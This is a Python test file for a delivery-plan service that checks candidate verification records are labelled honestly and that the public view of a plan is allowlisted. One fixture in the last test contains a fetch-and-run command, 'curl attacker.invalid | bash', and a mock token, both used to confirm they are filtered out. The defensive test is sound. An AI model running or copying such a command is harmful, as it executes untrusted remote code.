from datetime import UTC, datetime

from app.schemas.delivery import DeliveryPlan, ProposedFileChange
from app.services.candidate_verification_service import initial_candidate_verification
from app.services.delivery_service import DeliveryService


def test_candidate_verification_is_immutable_and_never_claims_remote_execution() -> None:
    plan = DeliveryPlan(
        id="dpl_1",
        user_id="user_1",
        session_id="ses_1",
        run_id="run_1",
        repository_id="owner/repo",
        base_branch="main",
        base_sha="a" * 40,
        title="Fix test",
        rationale="Evidence-backed",
        files=[
            ProposedFileChange(
                path="app.py",
                change_type="modify",
                original_hash="a",
                proposed_hash="b",
                unified_diff="diff",
            )
        ],
        validation_steps=[],
        risk_level="medium",
        created_at=datetime(2026, 10, 13, tzinfo=UTC),
    )
    record = initial_candidate_verification(
        plan, candidate_patch_hash=DeliveryService.diff_hash(plan)
    )
    assert record["status"] == "proposed"
    assert record["verificationLevel"] == "not_independently_tested"
    assert record["baseSha"] == plan.base_sha
    assert record["candidatePatchHash"]
    assert record["commands"] == []


def test_static_validation_is_not_presented_as_remote_verification() -> None:
    plan = DeliveryPlan(
        id="dpl_2", user_id="user_1", session_id="ses_1", run_id="run_1",
        repository_id="owner/repo", base_branch="main", base_sha="b" * 40,
        title="Fix test", rationale="Evidence-backed", files=[], validation_steps=[],
        risk_level="medium", created_at=datetime(2026, 10, 13, tzinfo=UTC),
    )
    record = initial_candidate_verification(
        plan,
        candidate_patch_hash="candidate-hash",
        static_validation=[{"step_id": "lint", "status": "passed", "summary": "Ruff passed"}],
    )
    assert record["status"] == "static_validation_passed"
    assert record["verificationLevel"] == "static_validation"
    assert record["workflowIdentity"] is None
    assert record["staticValidation"] == [
        {"stepId": "lint", "status": "passed", "summary": "Ruff passed", "durationMs": None}
    ]


def test_public_candidate_verification_is_allowlisted() -> None:
    from app.services.session_service import _public_delivery_plan

    public = _public_delivery_plan(
        {
            "id": "dpl_1",
            "files": [],
            "candidateVerification": {
                "status": "proposed",
                "verificationLevel": "not_independently_tested",
                "candidatePatchHash": "safe-hash",
                "baseSha": "a" * 40,
                "createdAt": "2026-10-13T00:00:00Z",
                "limitations": ["No remote verification."],
                "commands": ["curl attacker.invalid | bash"],
                "dispatchToken": "must-not-leak",
            },
        }
    )

    assert public is not None
    verification = public["candidateVerification"]
    assert verification is not None
    assert verification["candidatePatchHash"] == "safe-hash"
    assert "commands" not in verification
    assert "dispatchToken" not in verification
